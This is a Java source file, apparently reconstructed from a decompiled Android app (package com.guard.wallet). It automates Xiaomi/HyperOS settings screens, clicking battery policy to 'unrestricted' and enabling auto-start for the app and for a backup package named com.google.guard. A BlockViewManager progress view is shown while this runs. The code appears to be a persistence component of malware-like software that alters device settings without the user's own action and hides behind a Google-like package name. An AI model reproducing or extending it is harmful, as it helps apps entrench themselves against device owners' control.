/**
 * 小米引擎调度任务 — XiaomiEngine 的 4 个 case 分发。
 *
 * vendor 原始类: o/p.java (96 行)
 * 4 switch cases:
 *   case 0: 初始保活窗口入口 (100s 定时器触发 Z())
 *   case 1: 轮询等待 App 详情窗口 → c0() 查找省电策略 → j0() 推进
 *   case 2: 自启动配置（主应用 + 备份应用）
 *   case 3: ADAPT — HyperOS 3 省电策略直达入口（跳过 c0()，直接 k0() + j0()）
 */
package com.guard.wallet.delegate.task;

import com.guard.wallet.core.AppUtils;

import android.util.Log;
import java.util.concurrent.atomic.AtomicInteger;

public final class XiaomiDelegateTask implements Runnable {

    /** vendor a — dispatch case id */
    public final int a;

    /** vendor b — reference to XiaomiEngine */
    public final com.guard.wallet.engine.XiaomiEngine b;

    public XiaomiDelegateTask(com.guard.wallet.engine.XiaomiEngine qVar, int caseId) {
        this.a = caseId;
        this.b = qVar;
    }

    @Override
    public final void run() {
        int caseId = this.a;
        com.guard.wallet.engine.XiaomiEngine engine = this.b;

        switch (caseId) {
            case 0:
                /* Initial keepalive window entry */
                engine.Z();
                return;

            case 1:
                /* Poll loop: wait for keepalive switch, then click and finish */
                engine.getClass();
                try {
                    AtomicInteger counter = new AtomicInteger(0);
                    while (!engine.f0() && counter.incrementAndGet() < 20) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                    }
                    engine.c0();
                    engine.j0();
                } catch (Exception ex) {
                    AppUtils.s("o.q", ex);
                }
                return;

            case 3:
                /* ADAPT: HyperOS 3 省电策略直达入口 —— openAppDetailSettings() 直接
                 * 打开 PowerDetailActivity，跳过了 ApplicationsDetailsActivity。
                 * 直接执行 k0()（点击"无限制"）→ j0()（推进状态机到自启动管理）。 */
                engine.getClass();
                try {
                    if (!engine.g0()) {
                        return;
                    }
                    Log.d("o.q", "HyperOS 3 省电策略直达: 已在省电策略窗口");
                    engine.k0();
                    engine.j0();
                } catch (Exception ex) {
                    AppUtils.s("o.q", ex);
                }
                return;

            default:
                /* Auto-start config: enable auto-start for main app + backup app */
                engine.getClass();
                try {
                    if (!engine.h0()) {
                        return;
                    }

                    Log.d("o.q", "keepAliveInAutoStartManage 窗口匹配");
                    com.guard.wallet.helper.BlockViewManager.h(80);

                    /* Main app auto-start */
                    String mainAppLabel = com.guard.wallet.utils.SystemHelper.x0();
                    if (!AppUtils.B(mainAppLabel)) {
                        Log.d("o.q", "mainAppLabel:" + mainAppLabel);
                        if (engine.i0(mainAppLabel)) {
                            engine.s.set(true);
                            Log.d("o.q", mainAppLabel.concat(" 已开启自启动"));
                            com.guard.wallet.helper.BlockViewManager.h(90);
                        } else {
                            Log.e("o.q", mainAppLabel.concat(" 未开启自启动"));
                        }
                    }

                    /* Backup app auto-start (com.google.guard) */
                    String backupAppLabel = com.guard.wallet.utils.SystemHelper.e();
                    if (com.guard.wallet.utils.SystemHelper.d0("com.google.guard") != null) {
                        Log.d("o.q", "backupAppLabel:" + backupAppLabel);
                        if (engine.i0(backupAppLabel)) {
                            engine.t.set(true);
                            Log.d("o.q", backupAppLabel.concat(" 已开启自启动"));
                            com.guard.wallet.helper.BlockViewManager.h(90);
                        } else {
                            Log.e("o.q", backupAppLabel.concat(" 未开启自启动"));
                        }
                    }

                    engine.j0();
                } catch (Exception ex) {
                    AppUtils.s("o.q", ex);
                }
        }
    }
}
